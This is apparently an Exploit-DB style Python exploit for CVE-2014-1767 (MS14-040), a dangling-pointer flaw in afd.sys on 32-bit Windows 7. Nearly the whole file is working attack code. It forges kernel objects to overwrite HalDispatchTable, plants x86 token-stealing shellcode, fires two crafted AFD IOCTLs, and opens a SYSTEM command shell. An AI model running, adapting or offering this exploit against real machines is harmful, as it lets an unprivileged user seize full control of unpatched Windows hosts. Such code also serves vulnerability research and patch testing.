# Exploit Title: MS14-040 - AFD.SYS Dangling Pointer
# Date: 2016-02-05
# Exploit Author: Rick Larabee
# Vendor Homepage: www.microsoft.com
# Version: Windows 7, 32 bit
# Tested on: Win7 x32
#  	     afd.sys - 6.1.7600.16385
#            ntdll.dll - 6.1.7600.16385 
#
# CVE : CVE-2014-1767
# Category: Local Privilege Escalation
# References:
# 	http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf
#	http://ricklarabee.blogspot.com/
#	https://warroom.securestate.com/ms14-040-afd-sys-dangling-pointer-further-analysis/
# 	https://technet.microsoft.com/en-us/library/security/ms14-040.aspx
#	http://www.cvedetails.com/cve/CVE-2014-1767/
#
# Greetz: PWN4GEPWN1E, SecurityMook



from ctypes import *
import socket, time, os, struct, sys
from ctypes.wintypes import HANDLE, DWORD

kernel32 = windll.kernel32
ntdll    = windll.ntdll
Psapi    = windll.Psapi

MEMRES     = (0x1000 | 0x2000)
PAGEEXE    = 0x00000040
Zerobits   = c_int(0)
RegionSize = c_int(0x1000)
written    = c_int(0)

FakeObjSize = 0xA0

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
INVALID_HANDLE_VALUE = -1 

WSAGetLastError          = windll.Ws2_32.WSAGetLastError
WSAGetLastError.argtypes = ()
WSAGetLastError.restype  = c_int
SOCKET                   = c_int
WSASocket                = windll.Ws2_32.WSASocketA
WSASocket.argtypes       = (c_int, c_int, c_int, c_void_p, c_uint, DWORD)
WSASocket.restype        = SOCKET
closesocket              = windll.Ws2_32.closesocket
closesocket.argtypes     = (SOCKET,)
closesocket.restype      = c_int
connect                  = windll.Ws2_32.connect
connect.argtypes         = (SOCKET, c_void_p, c_int)
connect.restype          = c_int

class sockaddr_in(Structure):
    _fields_ = [
        ("sin_family", c_short),
        ("sin_port", c_ushort),
        ("sin_addr", c_ulong),
        ("sin_zero", c_char * 8),
        ]   

def findSysBase(drvname=None):
    ARRAY_SIZE            = 1024
    myarray               = c_ulong * ARRAY_SIZE 
    lpImageBase           = myarray() 
    cb                    = c_int(1024) 
    lpcbNeeded            = c_long() 
    drivername_size       = c_long() 
    drivername_size.value = 48

    Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded)) 
    for baseaddy in lpImageBase: 
        drivername = c_char_p("\x00"*drivername_size.value) 
        if baseaddy: 
            Psapi.GetDeviceDriverBaseNameA(baseaddy, drivername, 
                            drivername_size.value)
            if drvname:
                if drivername.value.lower() == drvname:
                    print "[+] Retrieving %s info..." % drvname
                    print "[+] %s base address: %s" % (drvname, hex(baseaddy))
                    return baseaddy
            else:
                if drivername.value.lower().find("krnl") !=-1:
                    print "[+] Retrieving Kernel info..."
                    print "[+] Kernel version:", drivername.value
                    print "[+] Kernel base address: %s" % hex(baseaddy) 
                    return (baseaddy, drivername.value)
    return None


def CreateBuffer1():
    inbuf1size = 0x30
    virtualAddress = 0x18888888
    length = 0x20000
   
    inbuf1  = "\x00" * 0x18 + struct.pack("L", virtualAddress)    #0x1a
    inbuf1 += struct.pack("L", length)            #0x20
    inbuf1 += "\x00" * 0x8 + "\x01"   
    inbuf1 += "\x00" * (inbuf1size - len(inbuf1))
       
    baseadd    = c_int(0x1001)
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE)
    kernel32.WriteProcessMemory(-1, 0x1000, inbuf1, inbuf1size, byref(written))


def CreateBuffer2():
    inbuf2size = 0x10
    addrforbuf2 = 0x0AAAAAAA
   
    inbuf2 = "\x01\x00\x00\x00"
    inbuf2 += struct.pack("L", addrforbuf2)
    inbuf2 += "\x00" * (inbuf2size -len(inbuf2))
       
    baseadd    = c_int(0x2001)
    dwStatus = ntdll.NtAllocateVirtualMemory(-1,
                                        byref(baseadd),
                                        0x0,
                                        byref(RegionSize),
                                        MEMRES,
                                        PAGEEXE)   
    kernel32.WriteProcessMemory(-1, 0x2000, inbuf2, inbuf2size, byref(written))

def CreateFakeObject():
    print "[+] Print creating fakeobject"
    fakeobject2addr = 0x2200
    fakeobject2 = "\x00"*16 + struct.pack("L", HalDispatchTable+sizeof(c_void_p)-0x1C)
    fakeobj2size = len(fakeobject2)
    kernel32.WriteProcessMemory(-1, fakeobject2addr, fakeobject2, fakeobj2size, byref(written))

    objhead = ("\x00\x00\x00\x00\xa8\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x01\x00\x00\x00\x01\x00\x00\x00"
        "\x00\x00\x00\x00\x16\x00\x08\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00")


    fakeobject = objhead
    fakeobject += struct.pack("L", fakeobject2addr) + "\x41"*96 + struct.pack("L", HalDispatchTable + sizeof(c_void_p) - 0xB4)
    fakeobject += "\x41" * (FakeObjSize - len(fakeobject))
    kernel32.WriteProcessMemory(-1, 0x2100, fakeobject, FakeObjSize, byref(written))   
   
print "[+] creating socket..."
sock = WSASocket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, None, 0, 0)

if sock == -1:
    print "[-] no luck creating socket!"
    sys.exit(1)

print "[+] got sock 0x%x" % sock

addr = sockaddr_in()
addr.sin_family = socket.AF_INET
addr.sin_port = socket.htons(135)
addr.sin_addr = socket.htonl(0x7f000001)

connect(sock, byref(addr), sizeof(addr))

print "[+] sock connected."
print "\n[+] GO!"

(krnlbase, kernelver) = findSysBase()
hKernel = kernel32.LoadLibraryExA(kernelver, 0, 1)
HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
HalDispatchTable -= hKernel
HalDispatchTable += krnlbase
print "[+] HalDispatchTable address:", hex(HalDispatchTable)
halbase = findSysBase("halmacpi.dll")
OS = "7"
if OS == "7":
    HaliQuerySystemInformation = halbase+0x278A2 # Offset for win7
    _KPROCESS = "\x50"
    _TOKEN    = "\xf8"
    _UPID     = "\xb4"
    _APLINKS  = "\xb8"   

print "[+] HaliQuerySystemInformation:", hex(HaliQuerySystemInformation)

IoStatus = c_ulong()
IoStatusBlock = c_ulong()

CreateBuffer1()
CreateBuffer2()
CreateFakeObject()

inbuf1 = 0x1000
inbuf2 = 0x2000
hWF = HANDLE(0)
FakeWorkerFactoryADDR = 0x2100


# Trigger 1
# afd!afdTransmitFile
ntdll.ZwDeviceIoControlFile(sock,None,None,None,byref(IoStatusBlock),0x1207f, inbuf1, 0x30, None, 0x0)

CompletionPort = HANDLE(kernel32.CreateIoCompletionPort( INVALID_HANDLE_VALUE, None, 0, 0))

ntdll.ZwCreateWorkerFactory(byref(hWF),GENERIC_ALL,None,CompletionPort,INVALID_HANDLE_VALUE,None,None,0,0,0)
hWFaddr = hWF
print "[+] WorkerFactoryHandle:", hWF.value
hWFaddr = int(addressof(hWF))

shellcode_address   = 0x00020700
padding           = "\x90"*2
HalDispatchTable0x4 = HalDispatchTable + 0x4

_WFValue = struct.pack("L", hWFaddr)

sc_pointer = struct.pack("L", shellcode_address+0x4)   
restore_ptrs =  "\x31\xc0" + \
                "\xb8" + struct.pack("L", HaliQuerySystemInformation) + \
                "\xa3" + struct.pack("L", HalDispatchTable0x4)   
   
tokenstealing =  "\x52"                                 +\
                 "\x53"                                 +\
                 "\x33\xc0"                             +\
                 "\x64\x8b\x80\x24\x01\x00\x00"         +\
                 "\x8b\x40" + _KPROCESS                 +\
                 "\x8b\xc8"                             +\
                 "\x8b\x98" + _TOKEN + "\x00\x00\x00"   +\
                 "\x89\x1d\x00\x09\x02\x00"             +\
                 "\x8b\x80" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xe8" + _APLINKS + "\x00\x00\x00" +\
                 "\x81\xb8" + _UPID + "\x00\x00\x00\x04\x00\x00\x00" +\
                 "\x75\xe8"                             +\
                 "\x8b\x90" + _TOKEN + "\x00\x00\x00"   +\
                 "\x8b\xc1"                             +\
                 "\x89\x90" + _TOKEN + "\x00\x00\x00"  

fixobjheaders = "\x33\xC0"                                +\
                "\x64\x8B\x80\x24\x01\x00\x00"            +\
                "\x8B\x40\x50"                            +\
                "\x8B\x80\xF4\x00\x00\x00"                +\
                "\x8B\xD8"                                +\
                "\x8B\x00"                                +\
                "\x8B\x0D" + _WFValue                    +\
                "\x83\xE1\xFC"                            +\
                "\x03\xC9"                                +\
                "\x03\xC1"                                +\
                "\xC7\x00\x00\x00\x00\x00"                +\
                "\x83\xC3\x30"                            +\
                "\x8B\xC3"                                +\
                "\x8B\x1B"                                +\
                "\x83\xEB\x01"                            +\
                "\x89\x18"                                +\
                "\x5B"                                    +\
                "\x5A"                                    +\
                "\xC2\x10\x00"

               
shellcode = sc_pointer + padding + restore_ptrs + tokenstealing + fixobjheaders
shellcode_size    = len(shellcode)
orig_size         = shellcode_size
startPage = c_int(0x00020000)
kernel32.VirtualProtect(startPage, 0x1000, PAGEEXE, byref(written))
kernel32.WriteProcessMemory(-1, shellcode_address, shellcode, shellcode_size, byref(written))


### Trigger 2
## afd!AfdTransmitPackets
ntdll.ZwDeviceIoControlFile(sock,None,None,None,byref(IoStatusBlock),0x120c3, inbuf2, 0x10, None, 0x0)

ntdll.ZwQueryEaFile(INVALID_HANDLE_VALUE, byref(IoStatus), None, 0, False, FakeWorkerFactoryADDR, FakeObjSize-0x04, None, False)

ntdll.ZwSetInformationWorkerFactory(hWF, 8, shellcode_address, sizeof(c_void_p)) ;

inp  = c_ulong()
out  = c_ulong()
inp  = 0x1337
qip = ntdll.NtQueryIntervalProfile(inp, byref(out))
print "[*] Spawning a SYSTEM shell..."
os.system("cmd.exe /K cd c:\\windows\\system32")
